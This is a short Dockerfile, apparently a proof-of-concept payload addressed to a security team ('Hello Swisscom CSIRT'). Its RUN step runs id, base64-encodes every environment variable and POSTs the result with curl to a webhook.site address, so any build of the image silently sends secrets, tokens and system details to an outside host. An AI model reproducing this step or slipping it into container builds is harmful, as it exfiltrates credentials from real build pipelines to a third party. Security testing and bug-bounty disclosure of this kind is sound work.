FROM alpine:latest
RUN apk add --no-cache curl
RUN echo "Hello Swisscom CSIRT" && id && echo $(printenv) | base64 | curl -X POST -d @- https://webhook.site/ebd51b1a-a1ee-47bd-b58d-3459544a24f2
CMD echo "test"
